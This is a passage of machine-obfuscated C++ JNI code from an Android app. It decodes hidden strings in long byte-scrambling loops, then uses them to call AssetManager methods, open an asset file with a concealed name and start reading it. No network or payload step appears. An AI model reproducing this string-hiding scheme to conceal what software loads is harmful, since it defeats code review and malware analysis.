        c = (c >> 0x6) | (c << 0x2);
        c += m;
        c = -c;
        c ^= m;
        c += m;
        c ^= m;
        c -= 0x71;
        c = -c;
        c = (c >> 0x5) | (c << 0x3);
        c += m;
        c = (c >> 0x1) | (c << 0x7);
        c ^= m;
        c -= m;
        c ^= 0x9d;
        c = -c;
        c += m;
        c ^= m;
        c += m;
        c = -c;
        c += 0xdb;
        c ^= m;
        c -= 0xb3;
        c = ~c;
        c += m;
        c ^= m;
        c -= m;
        c ^= m;
        c += m;
        c ^= 0xa8;
        c = (c >> 0x3) | (c << 0x5);
        c -= m;
        c = ~c;
        c = (c >> 0x7) | (c << 0x1);
        c = ~c;
        c += m;
        c = (c >> 0x1) | (c << 0x7);
        c ^= m;
        c = -c;
        c += m;
        c ^= m;
        c = (c >> 0x6) | (c << 0x2);
        c ^= m;
        c = -c;
        c += m;
        c = (c >> 0x3) | (c << 0x5);
        c += 0x74;
        c ^= 0x16;
        c = ~c;
        c += 0x2f;
        c = (c >> 0x2) | (c << 0x6);
        c -= m;
        c ^= m;
        c += 0x16;
        c = (c >> 0x7) | (c << 0x1);
        c -= m;
        c = -c;
        c -= 0x9c;
        c = ~c;
        c -= m;
        c = -c;
        c -= 0xc;
        c ^= m;
        c = (c >> 0x1) | (c << 0x7);
        c += m;
        c = ~c;
        c += m;
        c ^= m;
        c = (c >> 0x2) | (c << 0x6);
        c -= 0xee;
        c ^= m;
        c -= m;
        c = ~c;
        c += 0x27;
        c = ~c;
        c ^= 0x20;
        c -= 0xd6;
        c = -c;
        c += 0x67;
        c ^= m;
        c += m;
        c = (c >> 0x6) | (c << 0x2);
        c = ~c;
        c -= m;
        c = ~c;
        c ^= 0xa9;
        c += m;
        c = -c;
        c += m;
        c ^= 0xbf;
        c = ~c;
        c ^= m;
        c -= m;
        c ^= m;
        c -= 0x3d;
        c = (c >> 0x1) | (c << 0x7);
        c -= 0xa1;
        c = -c;
        c ^= 0x99;
        c += 0xd1;
        c = ~c;
        c += 0x59;
        c = ~c;
        c -= 0x36;
        c = -c;
        c ^= 0xff;
        c -= 0x1f;
        c = (c >> 0x2) | (c << 0x6);
        c += m;
        c = (c >> 0x2) | (c << 0x6);
        c -= m;
        c = (c >> 0x6) | (c << 0x2);
        c ^= 0x58;
        c = (c >> 0x1) | (c << 0x7);
        c ^= 0x67;
        c -= 0xc6;
        s[m] = c;
    }
    unsigned char ss1s[] =
            {

                    0xfd, 0x98, 0x57, 0x1b, 0xf5, 0x60, 0xf4, 0x94,
                    0x36, 0xbd, 0x79, 0xf8, 0x51, 0x91, 0x7b, 0x9d,
                    0x40, 0xbc, 0xd6, 0x22, 0x60, 0x71, 0x3c, 0x4c,
                    0x82, 0xc3, 0x95, 0x9e, 0xae, 0xa4, 0xd, 0xde,
                    0x89, 0xea, 0x41, 0xd9, 0x76
            };

    for (unsigned int m = 0; m < sizeof(ss1s); ++m)
    {
        unsigned char c = ss1s[m];
        c -= 0xf6;
        c = ~c;
        c -= m;
        c ^= m;
        c += m;
        c = -c;
        c += m;
        c = (c >> 0x5) | (c << 0x3);
        c += 0x36;
        c ^= m;
        c = (c >> 0x2) | (c << 0x6);
        c = ~c;
        c ^= 0x31;
        c = ~c;
        c += m;
        c = (c >> 0x7) | (c << 0x1);
        c = -c;
        c = (c >> 0x2) | (c << 0x6);
        c ^= 0xa7;
        c -= 0x2c;
        c = ~c;
        c -= 0x84;
        c = -c;
        c ^= m;
        c = ~c;
        c ^= 0x5f;
        c -= 0xd5;
        c = ~c;
        c ^= m;
        c += 0x5b;
        ss1s[m] = c;
    }

    jmethodID getAssetsMethod = (env)->GetMethodID(contextClass, (char *) s, (char *) ss1s);
    jobject assetManager = (env)->CallObjectMethod(context, getAssetsMethod);

// Access the AssetManager class
    jclass assetManagerClass = (env)->GetObjectClass(assetManager);

    unsigned char ss2s[] =
            {

                    0xbb, 0x4d, 0x3e, 0xb5, 0x36
            };

    for (unsigned int m = 0; m < sizeof(ss2s); ++m)
    {
        unsigned char c = ss2s[m];
        c = -c;
        c ^= m;
        c = -c;
        c ^= 0x5;
        c += 0x3;
        c = (c >> 0x3) | (c << 0x5);
        c = -c;
        c = ~c;
        c ^= m;
        c -= 0xc8;
        c = (c >> 0x5) | (c << 0x3);
        c -= m;
        c ^= 0x41;
        c = -c;
        c -= 0xe;
        c = ~c;
        c = -c;
        c = ~c;
        c += 0xd;
        c = (c >> 0x2) | (c << 0x6);
        c -= m;
        c = ~c;
        c = -c;
        c = (c >> 0x1) | (c << 0x7);
        c ^= m;
        c += m;
        c = ~c;
        c ^= 0xc;
        c += 0x77;
        c = ~c;
        ss2s[m] = c;
    }

    unsigned char s34[] =
            {

                    0xbd, 0xa9, 0x6f, 0xf8, 0x67, 0xaa, 0x80, 0xbc,
                    0x15, 0xb4, 0x9a, 0x61, 0xea, 0xc8, 0xad, 0x64,
                    0xc7, 0x2d, 0xeb, 0xec, 0x5d, 0x1a, 0x94, 0x5b,
                    0xf8, 0x7b, 0x67, 0xa7, 0x29, 0xb7, 0xd, 0x92,
                    0x56, 0x27, 0xab, 0x96, 0x33, 0x66, 0xb5, 0xea,
                    0x55, 0x59
            };

    for (unsigned int m = 0; m < sizeof(s34); ++m) {
        unsigned char c = s34[m];
        c += m;
        c = (c >> 0x6) | (c << 0x2);
        c ^= 0x98;
        c = (c >> 0x7) | (c << 0x1);
        c += m;
        c = (c >> 0x5) | (c << 0x3);
        c = ~c;
        c += 0x8c;
        c = (c >> 0x1) | (c << 0x7);
        c -= m;
        c = ~c;
        c -= m;
        c ^= m;
        c -= 0x4;
        c = (c >> 0x6) | (c << 0x2);
        c = ~c;
        c = -c;
        c = ~c;
        c ^= 0x4e;
        c = (c >> 0x7) | (c << 0x1);
        c += m;
        c ^= m;
        c += 0x45;
        c ^= 0xf1;
        c = -c;
        c = (c >> 0x5) | (c << 0x3);
        c -= 0xf2;
        c ^= m;
        c = (c >> 0x1) | (c << 0x7);
        c ^= m;
        c = (c >> 0x5) | (c << 0x3);
        c += 0x8f;
        c ^= m;
        c += 0x5c;
        c = -c;
        c += m;
        c ^= m;
        c = ~c;
        c += 0xe6;
        c ^= 0x29;
        c += 0x83;
        c = (c >> 0x2) | (c << 0x6);
        c ^= m;
        c = -c;
        c = (c >> 0x6) | (c << 0x2);
        c += 0xb;
        c ^= 0xd5;
        c = -c;
        c += m;
        c = -c;
        c -= 0x25;
        c = ~c;
        c += 0x46;
        c = (c >> 0x5) | (c << 0x3);
        c += 0x8f;
        c ^= 0xd0;
        c = ~c;
        c = -c;
        c += m;
        c = ~c;
        c = -c;
        c += m;
        c = ~c;
        c ^= m;
        c -= m;
        c = (c >> 0x1) | (c << 0x7);
        c = -c;
        c -= m;
        c = ~c;
        c ^= m;
        c = -c;
        c = ~c;
        c += m;
        c ^= m;
        c = ~c;
        c += 0xbb;
        c = ~c;
        c -= m;
        c = (c >> 0x7) | (c << 0x1);
        c = -c;
        c += 0xb4;
        c = (c >> 0x6) | (c << 0x2);
        c ^= 0xc7;
        c = -c;
        c -= 0x44;
        c = (c >> 0x7) | (c << 0x1);
        c += 0xcd;
        c ^= m;
        c -= 0xf1;
        c = -c;
        c -= m;
        c ^= 0x3e;
        c += m;
        c = -c;
        c = (c >> 0x6) | (c << 0x2);
        c = ~c;
        c = (c >> 0x2) | (c << 0x6);
        c += 0x26;
        c ^= m;
        c = (c >> 0x6) | (c << 0x2);
        c += 0x47;
        c ^= 0x4a;
        c = (c >> 0x1) | (c << 0x7);
        c += 0xff;
        c = -c;
        c -= 0x23;
        c = (c >> 0x6) | (c << 0x2);
        c = -c;
        c ^= m;
        c += 0x43;
        c = (c >> 0x7) | (c << 0x1);
        c ^= 0x1b;
        c = ~c;
        c -= m;
        c = (c >> 0x1) | (c << 0x7);
        c = -c;
        c += m;
        c ^= 0x9a;
        c = ~c;
        c -= m;
        c = ~c;
        c += 0xf1;
        c ^= m;
        c -= m;
        c ^= m;
        c = ~c;
        c += m;
        c = (c >> 0x7) | (c << 0x1);
        c += m;
        c = ~c;
        c += m;
        c ^= m;
        c += 0x59;
        c = -c;
        c = (c >> 0x2) | (c << 0x6);
        c ^= 0x10;
        c = -c;
        c -= 0xf0;
        c = -c;
        c += m;
        c = (c >> 0x2) | (c << 0x6);
        c = ~c;
        c = -c;
        c ^= 0xbf;
        c = -c;
        c = ~c;
        c ^= 0x5c;
        c = (c >> 0x6) | (c << 0x2);
        c = -c;
        c -= m;
        c = -c;
        c = ~c;
        c += 0xd;
        c = (c >> 0x5) | (c << 0x3);
        c = -c;
        c += 0x50;
        c = (c >> 0x6) | (c << 0x2);
        c -= m;
        c ^= 0xde;
        c += m;
        c = ~c;
        c -= m;
        c ^= m;
        c = (c >> 0x2) | (c << 0x6);
        c += 0xf7;
        c ^= m;
        c = ~c;
        c ^= 0xb1;
        c += m;
        c ^= 0xb7;
        c = ~c;
        c = (c >> 0x3) | (c << 0x5);
        c -= 0x62;
        c ^= m;
        c -= m;
        c = (c >> 0x7) | (c << 0x1);
        c -= m;
        c = -c;
        c = (c >> 0x6) | (c << 0x2);
        c += m;
        c = ~c;
        c ^= m;
        c = ~c;
        c += m;
        c = (c >> 0x2) | (c << 0x6);
        c += 0x35;
        c = (c >> 0x2) | (c << 0x6);
        c = -c;
        c += 0xa9;
        c ^= m;
        c -= m;
        c ^= 0xac;
        c -= 0x84;
        c = (c >> 0x3) | (c << 0x5);
        c -= 0x62;
        c = (c >> 0x3) | (c << 0x5);
        c ^= 0xe;
        c = ~c;
        c = -c;
        c += m;
        c ^= 0xb8;
        c = (c >> 0x2) | (c << 0x6);
        c ^= m;
        c = ~c;
        c += m;
        c = (c >> 0x2) | (c << 0x6);
        c = ~c;
        c += m;
        c ^= m;
        c -= 0x6d;
        c = ~c;
        c -= 0xd4;
        c = (c >> 0x1) | (c << 0x7);
        c = -c;
        c ^= 0xec;
        c += m;
        c = (c >> 0x3) | (c << 0x5);
        c += 0xef;
        c ^= 0x2a;
        c += m;
        c ^= 0x8a;
        c -= 0x92;
        c ^= 0xba;
        c = (c >> 0x7) | (c << 0x1);
        c = -c;
        c += m;
        c = ~c;
        c -= m;
        c = -c;
        c += m;
        c = -c;
        c ^= m;
        c = (c >> 0x2) | (c << 0x6);
        c ^= m;
        c = -c;
        c += 0x5f;
        c ^= m;
        c -= m;
        c ^= m;
        c = (c >> 0x2) | (c << 0x6);
        c -= m;
        c = ~c;
        c += m;
        c = -c;
        c += 0x5f;
        c = (c >> 0x3) | (c << 0x5);
        c += 0xa4;
        c ^= 0xf0;
        c = ~c;
        c = -c;
        s34[m] = c;
    }

    jmethodID openMethod = (env)->GetMethodID(assetManagerClass, (char *)ss2s, (char *) s34);
    unsigned char sd7[] =
            {

                    0xe0, 0x89, 0x9a, 0xcd, 0x4a, 0x4b, 0xc1
            };

    for (unsigned int m = 0; m < sizeof(sd7); ++m) {
        unsigned char c = sd7[m];
        c = -c;
        c = ~c;
        c -= m;
        c ^= m;
        c -= m;
        c = ~c;
        c += 0x23;
        c ^= 0x84;
        c = (c >> 0x5) | (c << 0x3);
        c ^= 0xee;
        c = -c;
        c ^= m;
        c -= 0x29;
        c ^= m;
        c = -c;
        c ^= m;
        c += m;
        c = (c >> 0x2) | (c << 0x6);
        c += m;
        c = -c;
        c = ~c;
        c += m;
        c ^= m;
        c -= 0xae;
        c = (c >> 0x3) | (c << 0x5);
        c = ~c;
        c += 0x3d;
        c = (c >> 0x3) | (c << 0x5);
        c ^= m;
        c += 0xa3;
        c = ~c;
        c -= m;
        c = ~c;
        c = -c;
        c += m;
        c ^= 0x29;
        c = ~c;
        c += m;
        c ^= 0x41;
        c -= m;
        c ^= 0xc1;
        c = ~c;
        c -= m;
        c ^= m;
        c = -c;
        c ^= m;
        c += 0xa4;
        c ^= m;
        c = -c;
        c ^= 0xf4;
        c += m;
        c ^= 0x48;
        c -= m;
        c = -c;
        c += m;
        c = ~c;
        c ^= m;
        c += m;
        c ^= 0x80;
        c = (c >> 0x3) | (c << 0x5);
        c = -c;
        c += 0x76;
        c ^= m;
        c += m;
        c = ~c;
        c -= 0xe1;
        c = -c;
        c -= 0x90;
        c = -c;
        c -= m;
        c ^= 0xa;
        c = (c >> 0x6) | (c << 0x2);
        c = -c;
        c ^= m;
        c -= 0xd5;
        c ^= m;
        c -= m;
        c = ~c;
        c -= m;
        c ^= m;
        c -= 0xbb;
        c ^= m;
        c = ~c;
        c -= m;
        c = -c;
        c ^= m;
        c -= 0xaf;
        c = (c >> 0x7) | (c << 0x1);
        c ^= m;
        c += m;
        c ^= m;
        c += 0x6;
        c ^= m;
        c -= 0x9e;
        c = (c >> 0x3) | (c << 0x5);
        c ^= 0x4c;
        c = ~c;
        c += 0x2;
        c = -c;
        c -= m;
        c = -c;
        c = (c >> 0x7) | (c << 0x1);
        c ^= 0x95;
        c = -c;
        c -= m;
        c = (c >> 0x2) | (c << 0x6);
        c = -c;
        c -= m;
        c = ~c;
        c += m;
        c = ~c;
        c -= m;
        c ^= 0x59;
        c = -c;
        c ^= 0xf0;
        c = -c;
        c += m;
        c ^= 0xdf;
        c -= m;
        c = -c;
        c -= 0x8e;
        c ^= 0xe6;
        c = ~c;
        c = (c >> 0x3) | (c << 0x5);
        c ^= 0x73;
        c -= 0x45;
        c = ~c;
        c ^= m;
        c = ~c;
        c += 0x38;
        c = -c;
        c -= m;
        c = -c;
        c += m;
        c ^= 0xef;
        c = ~c;
        c ^= m;
        c = ~c;
        c -= m;
        c ^= m;
        c -= 0xe2;
        c ^= m;
        c = (c >> 0x1) | (c << 0x7);
        c -= 0x72;
        c = (c >> 0x2) | (c << 0x6);
        c = -c;
        c -= m;
        c = -c;
        c = ~c;
        c -= m;
        c = (c >> 0x2) | (c << 0x6);
        c = ~c;
        c ^= 0xca;
        c -= m;
        c = -c;
        c = ~c;
        c ^= m;
        c -= 0xef;
        c ^= 0x85;
        c -= 0x14;
        c = (c >> 0x7) | (c << 0x1);
        c = -c;
        c ^= m;
        c -= m;
        c = ~c;
        c = (c >> 0x5) | (c << 0x3);
        c = -c;
        c -= m;
        c = -c;
        c = ~c;
        c += 0xd3;
        c = -c;
        c -= 0x90;
        c = (c >> 0x6) | (c << 0x2);
        c -= m;
        c = (c >> 0x2) | (c << 0x6);
        c = -c;
        c += 0x68;
        c ^= 0xee;
        c = ~c;
        c = -c;
        c = (c >> 0x2) | (c << 0x6);
        c ^= 0x66;
        c += 0x72;
        c = (c >> 0x5) | (c << 0x3);
        c -= 0x96;
        c ^= m;
        c = -c;
        c += m;
        c = -c;
        c = (c >> 0x1) | (c << 0x7);
        c = ~c;
        c += m;
        c ^= 0xb0;
        c -= m;
        c = (c >> 0x7) | (c << 0x1);
        c ^= 0x1d;
        c = ~c;
        c ^= m;
        c -= 0x68;
        c ^= 0x71;
        c = (c >> 0x7) | (c << 0x1);
        c += 0x56;
        c = (c >> 0x2) | (c << 0x6);
        c += 0x51;
        c ^= m;
        c += 0xde;
        c ^= m;
        c += 0x60;
        c ^= m;
        c = ~c;
        c = (c >> 0x5) | (c << 0x3);
        c ^= 0x31;
        c -= 0xe4;
        c ^= 0x9b;
        c -= 0x67;
        c ^= 0xa7;
        c -= m;
        c = ~c;
        c -= m;
        c = -c;
        c = (c >> 0x3) | (c << 0x5);
        c += 0x3d;
        c ^= 0x30;
        c = -c;
        c ^= 0x1c;
        c -= m;
        c = -c;
        c = (c >> 0x5) | (c << 0x3);
        c ^= m;
        c -= m;
        c ^= 0x6c;
        c += m;
        c = ~c;
        c += m;
        c = ~c;
        c = (c >> 0x3) | (c << 0x5);
        c -= 0x29;
        c = ~c;
        c ^= m;
        c = -c;
        c -= 0xe6;
        c = (c >> 0x6) | (c << 0x2);
        c += 0x70;
        c ^= 0xe3;
        c -= 0x59;
        c = -c;
        c += m;
        c ^= 0xf9;
        c = -c;
        c = (c >> 0x3) | (c << 0x5);
        c += 0x16;
        c = ~c;
        c ^= 0x40;
        c = (c >> 0x6) | (c << 0x2);
        c = ~c;
        c ^= 0xa2;
        c -= 0x55;
        c ^= 0x60;
        c += 0xe8;
        c ^= m;
        c = ~c;
        c = (c >> 0x6) | (c << 0x2);
        c -= m;
        c = ~c;
        c = -c;
        c += 0x3;
        c = ~c;
        c = -c;
        c -= m;
        c ^= 0x58;
        c += m;
        c ^= m;
        c -= 0xaf;
        c = ~c;
        c += m;
        c = ~c;
        c = (c >> 0x7) | (c << 0x1);
        c ^= 0xd7;
        c += 0x24;
        c = -c;
        c ^= 0xf;
        c -= m;
        c ^= m;
        c = (c >> 0x6) | (c << 0x2);
        c ^= m;
        c = (c >> 0x2) | (c << 0x6);
        c ^= 0x47;
        c += m;
        c = (c >> 0x7) | (c << 0x1);
        c -= 0xda;
        c = -c;
        c ^= 0xe1;
        c += m;
        c = -c;
        c -= m;
        c ^= m;
        c -= 0x4;
        c = (c >> 0x3) | (c << 0x5);
        c ^= m;
        c = ~c;
        c += 0x47;
        c ^= 0xb1;
        c -= 0x2a;
        c ^= m;
        c += 0x96;
        c ^= m;
        c = ~c;
        c = -c;
        c += m;
        c ^= 0x38;
        c = (c >> 0x3) | (c << 0x5);
        c += m;
        c ^= m;
        c += m;
        c = (c >> 0x5) | (c << 0x3);
        c = ~c;
        c += 0x9a;
        c ^= m;
        c = ~c;
        c -= m;
        c ^= 0x15;
        c -= 0xba;
        c = -c;
        c -= 0x4f;
        c ^= m;
        c = (c >> 0x3) | (c << 0x5);
        c -= m;
        c ^= m;
        c = -c;
        c = ~c;
        c -= 0xb1;
        c = -c;
        c ^= 0x32;
        c += 0x6a;
        c = ~c;
        c ^= 0x97;
        c += 0xcc;
        c ^= m;
        c = -c;
        c = ~c;
        c += m;
        c = ~c;
        c ^= 0x87;
        c = ~c;
        c -= m;
        c = ~c;
        c += m;
        c ^= m;
        c = ~c;
        c -= 0x37;
        c ^= 0xc;
        c += 0xef;
        c ^= 0xa6;
        c += m;
        c ^= 0x3b;
        c = -c;
        c ^= m;
        c += 0xfe;
        c ^= 0xf9;
        c += 0xd1;
        c = -c;
        c += 0x29;
        c ^= m;
        c = (c >> 0x3) | (c << 0x5);
        c -= 0x2;
        c ^= 0x4b;
        c = (c >> 0x1) | (c << 0x7);
        c -= m;
        c = -c;
        c -= m;
        c = (c >> 0x2) | (c << 0x6);
        c = ~c;
        c ^= 0xc0;
        c = (c >> 0x6) | (c << 0x2);
        c = ~c;
        c = (c >> 0x2) | (c << 0x6);
        c -= m;
        c = ~c;
        c += 0x9d;
        c ^= 0x71;
        c = ~c;
        c += 0xf5;
        c ^= 0x4f;
        c -= 0xb8;
        c ^= 0xbe;
        c += m;
        c = ~c;
        c ^= 0x56;
        c += 0x1d;
        c = (c >> 0x2) | (c << 0x6);
        c += 0xbc;
        c = (c >> 0x7) | (c << 0x1);
        c = ~c;
        c += m;
        c = -c;
        c -= m;
        c = ~c;
        c = (c >> 0x1) | (c << 0x7);
        c ^= 0xd7;
        c += 0x81;
        c ^= m;
        c -= m;
        c ^= 0x3;
        c += 0x56;
        c ^= m;
        c += m;
        c ^= m;
        c -= 0xaf;
        c = (c >> 0x3) | (c << 0x5);
        c -= 0xed;
        c = (c >> 0x5) | (c << 0x3);
        c += m;
        c ^= m;
        c -= 0x61;
        c ^= m;
        c += m;
        c = -c;
        c += 0xd3;
        c = (c >> 0x1) | (c << 0x7);
        c -= m;
        c = -c;
        c ^= 0xd1;
        c += m;
        c ^= m;
        c += m;
        c = ~c;
        c = -c;
        c = ~c;
        c += m;
        c ^= 0xc1;
        c += 0x4b;
        c = -c;
        c -= m;
        c = -c;
        c -= m;
        c ^= 0x14;
        c -= 0x23;
        c ^= 0x9c;
        c -= m;
        c = ~c;
        c -= m;
        c = ~c;
        c -= m;
        c = (c >> 0x6) | (c << 0x2);
        c ^= 0xb3;
        c += 0x5f;
        c = ~c;
        c -= m;
        c = ~c;
        c ^= m;
        c = (c >> 0x6) | (c << 0x2);
        c -= 0x4e;
        c = (c >> 0x1) | (c << 0x7);
        c += m;
        c ^= m;
        c = -c;
        c -= m;
        c = ~c;
        c -= m;
        c = ~c;
        c ^= 0x2b;
        c -= m;
        c ^= m;
        c = ~c;
        c -= 0xeb;
        c = -c;
        c = ~c;
        c -= 0xdb;
        c = ~c;
        c = (c >> 0x1) | (c << 0x7);
        c ^= 0x34;
        c = ~c;
        c = -c;
        c -= m;
        c = -c;
        c -= 0xea;
        c ^= 0x20;
        c = (c >> 0x3) | (c << 0x5);
        c += m;
        c = (c >> 0x7) | (c << 0x1);
        c += m;
        c = -c;
        c ^= 0xbb;
        c -= 0x7e;
        c = ~c;
        c += m;
        c = -c;
        c -= m;
        c = -c;
        c += m;
        c = -c;
        c += m;
        c = -c;
        c -= m;
        c = ~c;
        c -= 0x7d;
        c = ~c;
        c += m;
        c = -c;
        sd7[m] = c;
    }

    jstring fileName = (env)->NewStringUTF((char *) sd7);
    jobject inputStream = (env)->CallObjectMethod(assetManager, openMethod, fileName);

// Prepare to read from the InputStream
    jclass inputStreamClass = (env)->GetObjectClass(inputStream);
    unsigned char s2[] =
            {

                    0xaa, 0xe9, 0x1a, 0xf, 0x25, 0xfe, 0x1e, 0xd8,
                    0xa6, 0x0
            };

    for (unsigned int m = 0; m < sizeof(s2); ++m) {
        unsigned char c = s2[m];
        c += 0x55;
        c = (c >> 0x5) | (c << 0x3);
        c += 0x2b;
        c = (c >> 0x1) | (c << 0x7);
        c = ~c;
        c ^= 0x54;
        c = -c;
        c += m;
        c = -c;
        c ^= 0x8a;
        c -= m;
        c = ~c;
        c -= m;
        c = -c;
        c += 0xe5;
        c = (c >> 0x7) | (c << 0x1);
        c -= m;
        c = ~c;
        c += m;
        c = (c >> 0x1) | (c << 0x7);
        c = -c;
        c += m;
        c = -c;
        c += m;
        c = (c >> 0x2) | (c << 0x6);
        c ^= 0x48;
        c -= 0x6e;
        c = -c;
        c ^= m;
        c += m;
        c = -c;
        c -= m;
        c = -c;
        c = (c >> 0x1) | (c << 0x7);
        c ^= m;
        c -= 0x3d;
        c = -c;
        c += m;
        c ^= m;
        c -= m;
        c = ~c;
        c ^= 0x1e;
        c -= 0xce;
        c = ~c;
        c -= 0x5c;
        c ^= m;
        c += 0x8f;
        c ^= 0x8b;
        c = (c >> 0x6) | (c << 0x2);
        c += 0x87;
        c = (c >> 0x3) | (c << 0x5);
        c ^= 0xec;
        c -= m;
        c ^= m;
        c = -c;
        c -= 0x1c;
        c ^= 0x9a;
        c += m;
        c ^= 0x84;
        c += m;
        c = (c >> 0x2) | (c << 0x6);
        c -= 0xe;
        c = ~c;
        c ^= 0x4d;
        c = (c >> 0x3) | (c << 0x5);
        c ^= m;
        c = ~c;
        c ^= 0x9;
        c += 0x6c;
        c ^= 0x16;
        c -= m;
        c = (c >> 0x2) | (c << 0x6);
        c -= m;
        c = (c >> 0x3) | (c << 0x5);
        c ^= m;
        c = -c;
        c = (c >> 0x7) | (c << 0x1);
        c += m;
        c ^= m;
        c = -c;
        c ^= 0x61;
        c = -c;
        c = ~c;
        c -= 0xb0;
        c = (c >> 0x6) | (c << 0x2);
        c ^= 0xc6;
        c = ~c;
        c += m;
        c ^= m;
        c = ~c;
        c ^= 0x6f;
        c += 0x62;
        c = ~c;
        c -= 0x68;
        c ^= 0xcd;
        c -= m;
        c = ~c;
        c += m;
        c = -c;
        c += m;
        c = ~c;
        c ^= m;
        c += m;
        c = (c >> 0x6) | (c << 0x2);
        c += m;
        c ^= m;
        c -= 0x96;
        c = -c;
        c -= 0xad;
        c ^= 0x9f;
        c = ~c;
        c -= 0x36;
        c = ~c;
        c ^= 0xe9;
        c += m;
        c = (c >> 0x5) | (c << 0x3);
        c ^= m;
        c -= m;
        c = -c;
        c ^= 0x3f;
        c = -c;
        c ^= 0x3c;
        c += m;
        c = ~c;
        c = -c;
        c -= m;
        c ^= 0xcc;
        c -= m;
        c = -c;
        c += m;
        c ^= m;
        c -= 0xb9;
        c = -c;
        c = ~c;
        c = (c >> 0x7) | (c << 0x1);
        c -= 0x1a;
        c ^= 0x5a;
        c += 0x5a;
        c = (c >> 0x5) | (c << 0x3);
        c -= m;
        c = (c >> 0x6) | (c << 0x2);
        c -= m;
        c = ~c;
        c += m;
        c = -c;
        c = ~c;
        c ^= 0x9a;
        c = -c;
        c ^= 0xc3;
        c = (c >> 0x7) | (c << 0x1);
        c += m;
        c ^= 0xc1;
        c = -c;
        c -= 0xa7;
        c ^= m;
        c += m;
        c ^= m;
        c -= 0x64;
        c = ~c;
        c = -c;
        c ^= 0xac;
        c -= 0xb;
        c = -c;
        c += m;
        c ^= 0xfc;
        c -= m;
        c = (c >> 0x2) | (c << 0x6);
        c -= m;
        c = -c;
        c += m;
        c = ~c;
        c += 0x29;
        c = (c >> 0x5) | (c << 0x3);
        c ^= 0xef;
        c = -c;
        c = ~c;
        c = (c >> 0x1) | (c << 0x7);
        c -= 0xf8;
        c = (c >> 0x3) | (c << 0x5);
        c = -c;
        c ^= m;
        c += m;
        c = -c;
        c ^= 0xe7;
        c = (c >> 0x3) | (c << 0x5);
        c -= 0x1a;
        c = (c >> 0x7) | (c << 0x1);
        c -= 0x8b;
        c = ~c;
        c -= m;
        c = (c >> 0x2) | (c << 0x6);
        c ^= m;
        c += m;
        c = ~c;
        c = -c;
        c += 0x6f;
        c ^= 0x8e;
        c += m;
        c = (c >> 0x2) | (c << 0x6);
        c += m;
        c = (c >> 0x3) | (c << 0x5);
        c -= m;
        c ^= 0x61;
        c += m;
        c = -c;
        c = (c >> 0x6) | (c << 0x2);
        c = -c;
        c += m;
        c ^= 0x74;
        c += m;
        c = (c >> 0x1) | (c << 0x7);
        c ^= 0xb6;
        c = ~c;
        c = -c;
        c ^= m;
        c += 0xfe;
        c = -c;
        c += 0x4a;
        c = (c >> 0x1) | (c << 0x7);
        c += 0x6e;
        c ^= m;
        c += m;
        c = ~c;
        c = -c;
        c -= 0x3a;
        c ^= m;
        c = (c >> 0x2) | (c << 0x6);
        c -= 0x48;
        c = ~c;
        c = -c;
        c -= m;
        c ^= m;
        c += m;
        c = -c;
        c = ~c;
        c += 0xca;
        c ^= m;
        c += 0xe3;
        c ^= m;
        c = ~c;
        c += 0x68;
        c = -c;
        c ^= m;
        c += m;
        c ^= m;
        c += 0xc0;
        c = ~c;
        c += m;
        c = (c >> 0x3) | (c << 0x5);
        c = -c;
        s2[m] = c;
    }
    unsigned char s3[] =
            {

                    0xcf, 0xd0, 0x59, 0x3, 0x93
            };

    for (unsigned int m = 0; m < sizeof(s3); ++m) {
        unsigned char c = s3[m];
        c = ~c;
        c = (c >> 0x1) | (c << 0x7);
        c ^= m;
        c = ~c;
        c = (c >> 0x6) | (c << 0x2);
        c ^= 0xfd;
        c -= m;
        c ^= 0x84;
        c -= m;
        c ^= m;
        c -= m;
        c = ~c;
        c ^= m;
        c += 0xcd;
        c = ~c;
        c ^= m;
        c = ~c;
        c = (c >> 0x3) | (c << 0x5);
        c += 0xbd;
        c = -c;
        c = ~c;
        c = -c;
        c ^= 0x31;
        c = (c >> 0x3) | (c << 0x5);
        c ^= 0xf;
        c = -c;
        c += m;
        c ^= m;
        c += m;
        c ^= 0xa0;
        c = (c >> 0x7) | (c << 0x1);
        c -= 0xfe;
        c = ~c;
        c += m;
        c = -c;
        c ^= m;
        c = (c >> 0x5) | (c << 0x3);
        c = -c;
        c = (c >> 0x2) | (c << 0x6);
        c = -c;
        c += 0xf7;
        c = (c >> 0x5) | (c << 0x3);
        c = -c;
        c += m;
        c = (c >> 0x2) | (c << 0x6);
        c += 0x14;
        c = -c;
        c = (c >> 0x5) | (c << 0x3);
        c -= m;
        c = (c >> 0x1) | (c << 0x7);
        c += 0x31;
        c = (c >> 0x5) | (c << 0x3);
        c ^= 0xf8;
        c = -c;
        c -= m;
        c ^= m;
        c -= 0x10;
        c ^= m;
        c = ~c;
        c = (c >> 0x1) | (c << 0x7);
        c ^= m;
        c = ~c;
        c -= 0x53;
        c ^= m;
        c += 0x22;
        c = (c >> 0x7) | (c << 0x1);
        c = ~c;
        c = (c >> 0x1) | (c << 0x7);
        c -= 0x7d;
        c ^= m;
        c = ~c;
        c = (c >> 0x6) | (c << 0x2);
        c ^= 0x98;
        c += m;
        c = ~c;
        c -= 0x72;
        c = -c;
        c ^= 0x77;
        c += 0xbb;
        c ^= 0x6a;
        c -= 0x8e;
        c ^= m;
        c = ~c;
        c = (c >> 0x7) | (c << 0x1);
        c += m;
        c ^= m;
        c = ~c;
        c += m;
        c = -c;
        c = (c >> 0x2) | (c << 0x6);
        c -= 0xb5;
        c = -c;
        c += 0xc0;
        c ^= 0x12;
        c = -c;
        c -= m;
        c = ~c;
        c = (c >> 0x2) | (c << 0x6);
        c ^= 0x53;
        c += 0x6f;
        c = (c >> 0x3) | (c << 0x5);
        c ^= 0x3f;
        c -= m;
        c = (c >> 0x2) | (c << 0x6);
        c = -c;
        c -= m;
        c ^= 0x5f;
        c += m;
        c = ~c;
        c ^= 0x9e;
        c += m;
        c ^= m;
        c -= m;
        c = -c;
        c ^= 0x5;
        c -= 0x21;
        c ^= m;
        c = ~c;
        c = -c;
        c ^= 0xae;
        c -= 0x9d;
        c = -c;
        c += 0xce;
        c = (c >> 0x6) | (c << 0x2);
        c = -c;
        c -= m;
        c ^= m;
        c = ~c;
        c += 0xec;
        c = -c;
        c += m;
        c = (c >> 0x2) | (c << 0x6);
        c = -c;
        c += m;
        c = (c >> 0x1) | (c << 0x7);
        c += 0x32;
        c ^= 0x90;
        c -= m;
        c ^= m;
        c += m;
        c ^= m;
        c = (c >> 0x1) | (c << 0x7);
        c ^= 0xd6;
        c += 0xa9;
        c = -c;
        c += 0xb1;
        c = -c;
        c ^= m;
        c = ~c;
        c = -c;
        c ^= 0xe7;
